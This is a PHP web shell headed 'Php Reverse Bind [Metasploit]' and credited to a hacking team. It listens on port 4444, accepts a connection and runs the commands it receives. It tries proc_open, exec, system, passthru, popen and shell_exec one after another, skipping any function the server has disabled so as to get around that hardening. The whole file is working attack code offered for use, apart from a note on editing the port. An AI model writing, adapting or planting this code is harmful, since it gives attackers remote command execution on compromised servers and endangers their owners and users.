<?php

#####
# Php Reverse Bind [Metasploit]
# Credit by: N-Cen-Dainamix
#####
#(C) 2014 ~ 2016 by: `Dainamix~Team`

# edit port for connect back

@set_time_limit(0); 
@ignore_user_abort(1); 
@ini_set('max_execution_time',0);

      $ZAqp=@ini_get('disable_functions');
      if(!empty($ZAqp)){
        $ZAqp=preg_replace('/[, ]+/', ',', $ZAqp);
        $ZAqp=explode(',', $ZAqp);
        $ZAqp=array_map('trim', $ZAqp);
      }else{
        $ZAqp=array();
      }
      
    $port=4444; # edit port here

    $scl='socket_create_listen';
    if(is_callable($scl)&&!in_array($scl,$ZAqp)){
      $sock=@$scl($port);
    }else{
      $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      $ret=@socket_bind($sock,0,$port);
      $ret=@socket_listen($sock,5);
    }
    $msgsock=@socket_accept($sock);
    @socket_close($sock);

    while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
    {
      $o = '';
      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
      if(FALSE===$c){break;}
      if(substr($c,0,3) == 'cd '){
        chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
        break;
      }else{
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $fSFfd='is_callable';
      $mjaN='in_array';
      
      if($fSFfd('proc_open')and!$mjaN('proc_open',$ZAqp)){
        $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($fSFfd('exec')and!$mjaN('exec',$ZAqp)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($fSFfd('system')and!$mjaN('system',$ZAqp)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($fSFfd('passthru')and!$mjaN('passthru',$ZAqp)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($fSFfd('popen')and!$mjaN('popen',$ZAqp)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($fSFfd('shell_exec')and!$mjaN('shell_exec',$ZAqp)){
        $o=shell_exec($c);
      }else
      {
        $o=0;
      }
    
      }
      @socket_write($msgsock,$o,strlen($o));
    }
    @socket_close($msgsock);
    ?>
